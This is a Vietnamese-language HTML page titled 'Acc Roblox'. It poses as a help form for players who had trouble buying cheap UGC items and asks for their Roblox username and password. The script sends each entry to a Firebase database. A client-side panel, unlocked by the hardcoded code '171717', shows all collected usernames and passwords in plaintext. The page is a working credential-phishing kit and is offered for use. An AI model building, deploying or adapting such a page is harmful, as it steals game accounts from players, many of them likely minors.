<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Quan tr·ªçng cho mobile -->
  <title>Acc Roblox</title>
  <style>
    body { font-family: Arial, sans-serif; background: linear-gradient(135deg,#3b82f6,#2563eb); color:white; margin:0; text-align:center; }
    h2 { font-size:18px; margin-top:15px; }
    .screen{ display:none; } .active{ display:block; }
    .form-box{ background:rgba(255,255,255,0.15); padding:15px; border-radius:12px; display:block; width:90%; max-width:320px; box-shadow:0 4px 12px rgba(0,0,0,0.3); margin:12px auto; }
    input{ display:block; width:95%; padding:10px; margin:10px auto; border:none; border-radius:6px; font-size:14px; }
    button{ background:#16a34a; color:white; border:none; padding:10px; width:95%; border-radius:6px; font-size:15px; cursor:pointer; }
    button:disabled{ background:gray; cursor:not-allowed; }
    .data-box{ text-align:left; background:rgba(0,0,0,0.3); padding:10px; margin:10px auto; border-radius:8px; width:90%; max-width:320px; position:relative; font-size:14px; }
    .trash{ position:absolute; top:8px; right:8px; background:red; border:none; padding:6px 8px; border-radius:6px; cursor:pointer; color:white; font-size:13px; }
  </style>
</head>
<body>

<!-- Screen 1 -->
<div id="screen1" class="screen active">
  <h2>acc roblox c·ªßa b·∫°n</h2>
  <div class="form-box">
    <input type="text" id="username" placeholder="T√™n">
    <input type="password" id="password" placeholder="Mk">
    <input type="text" id="issue" placeholder="B·∫°n ƒëang g·∫∑p chuy·ªán g√¨">
    <p style="font-size:13px;">b·∫°n ƒëang g·∫∑p v·∫•n ƒë·ªÅ g√¨ khi mua ugc gi√° r·∫ª ?<br>h√£y ƒë·ªÉ l·∫°i th√¥ng tin ·ªü d∆∞·ªõi</p>
    <button id="submitBtn" disabled>L∆∞u</button>
  </div>

  <div class="form-box">
    <input type="password" id="admin" placeholder="Quy·ªÅn admin">
    <button id="adminBtn">ƒêƒÉng nh·∫≠p admin</button>
  </div>
</div>

<!-- Screen 2 -->
<div id="screen2" class="screen">
  <h2>Danh s√°ch ƒë√£ nh·∫≠p</h2>
  <div id="dataList"></div>
  <button onclick="goBack()">‚¨Ö Quay v·ªÅ</button>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
<script>
  // Config Firebase c·ªßa b·∫°n
  const firebaseConfig = {
    apiKey: "AIzaSyCHXm75zQ7CsJxgRzYGpFMuXoNvdaus4EU",
    authDomain: "roblox-acc-form.firebaseapp.com",
    databaseURL: "https://roblox-acc-form-default-rtdb.firebaseio.com",
    projectId: "roblox-acc-form",
    storageBucket: "roblox-acc-form.appspot.com",
    messagingSenderId: "1005999213453",
    appId: "1:1005999213453:web:cc6efb5ac520bdb830cbc4",
    measurementId: "G-5KDY9YJ5EM"
  };

  // Kh·ªüi t·∫°o
  const app = firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  const username=document.getElementById("username");
  const password=document.getElementById("password");
  const issue=document.getElementById("issue");
  const submitBtn=document.getElementById("submitBtn");
  const adminInput=document.getElementById("admin");
  const adminBtn=document.getElementById("adminBtn");
  const screen1=document.getElementById("screen1");
  const screen2=document.getElementById("screen2");
  const dataList=document.getElementById("dataList");

  function checkInputs(){
    submitBtn.disabled = !(username.value.trim() && password.value.trim() && issue.value.trim());
  }
  username.addEventListener("input",checkInputs);
  password.addEventListener("input",checkInputs);
  issue.addEventListener("input",checkInputs);

  // L∆∞u d·ªØ li·ªáu v√†o Firebase
  submitBtn.addEventListener("click",()=>{
    const newRef = db.ref("accounts").push();
    newRef.set({
      user: username.value.trim(),
      pass: password.value.trim(),
      iss: issue.value.trim()
    }).then(()=>{
      username.value=""; password.value=""; issue.value="";
      submitBtn.disabled=true;
      alert("‚úÖ ƒê√£ l∆∞u th√¥ng tin!");
    }).catch(err=>{
      alert("‚ùå L·ªói: " + err);
    });
  });

  // Admin login
  adminBtn.addEventListener("click",()=>{
    if(adminInput.value==="171717"){ showScreen2(); }
    else alert("Sai m·∫≠t kh·∫©u admin!");
    adminInput.value="";
  });

  function showScreen2(){
    screen1.classList.remove("active");
    screen2.classList.add("active");
    renderData();
  }

  // Render d·ªØ li·ªáu realtime
  function renderData(){
    db.ref("accounts").on("value", snapshot=>{
      dataList.innerHTML="";
      if(!snapshot.exists()){ dataList.innerHTML="<p>Ch∆∞a c√≥ d·ªØ li·ªáu</p>"; return; }
      snapshot.forEach(child=>{
        const item = child.val();
        const key = child.key;
        const div=document.createElement("div");
        div.classList.add("data-box");
        div.innerHTML=`
          <p><b>Tk:</b> ${item.user}</p>
          <p><b>Mk:</b> ${item.pass}</p>
          <p><b>Chuy·ªán ƒëang g·∫∑p:</b> ${item.iss}</p>
        `;
        const btn=document.createElement("button");
        btn.innerText="üóë Xo√°";
        btn.className="trash";
        btn.onclick=()=>{
          if(confirm("B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a m·ª•c n√†y?")){
            db.ref("accounts/"+key).remove();
          }
        };
        div.appendChild(btn);
        dataList.appendChild(div);
      });
    });
  }

  function goBack(){ 
    screen2.classList.remove("active"); 
    screen1.classList.add("active"); 
  }
</script>
</body>
</html>
